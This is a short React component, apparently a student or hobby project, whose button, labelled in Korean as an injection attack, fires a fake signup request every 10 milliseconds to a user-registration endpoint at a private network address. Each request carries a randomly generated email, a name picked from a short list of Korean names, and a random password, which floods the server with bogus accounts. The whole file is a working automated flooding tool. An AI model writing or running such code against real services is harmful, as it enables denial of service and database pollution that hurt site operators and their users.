function Inject() {
	function start() {
		var i = 1;
		const arr = ['아이알', '어드민', '오건호', '김민서', '오거노'];
		const en = [
			'q',
			'w',
			'e',
			'r',
			't',
			'y',
			'u',
			'i',
			'i',
			'o',
			'p',
			'o',
			'a',
			's',
			's',
			'd',
			'f',
			'g',
			'h',
			'j',
			'k',
			'l',
			'z',
			'x',
			'c',
			'v',
			'b',
			'n',
			'm',
		];
		var j = 10000;
		setInterval(() => {
			const randomElement = arr[Math.floor(Math.random() * arr.length)];
			const enn = en[Math.floor(Math.random() * en.length)];
			var data = {
				email: `${enn}${i}${enn}@gmail.com`,
				name: `${randomElement}`,
				age: `${j}`,
				password: `${Math.random() * 100}`,
				isAdmin: false,
			};

			async function inject() {
				const response = await fetch('http://192.168.99.115:5000/user/signup', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
					},
					body: JSON.stringify(data),
				});

				if (!response.ok) {
					console.error('HTTP error', response.status);
					return;
				}

				const result = await response.json();
				console.log(i, '번');
			}
			i = i + 1;
			j = j + 1;
			// if (j > 2000000) {
			// 	j = 1;
			// }
			inject();
		}, 10);
	}

	return (
		<div style={{ marginLeft: '1000px', marginTop: '300px' }}>
			<button onClick={start}>인젝션 공격하기</button>
		</div>
	);
}

export default Inject;
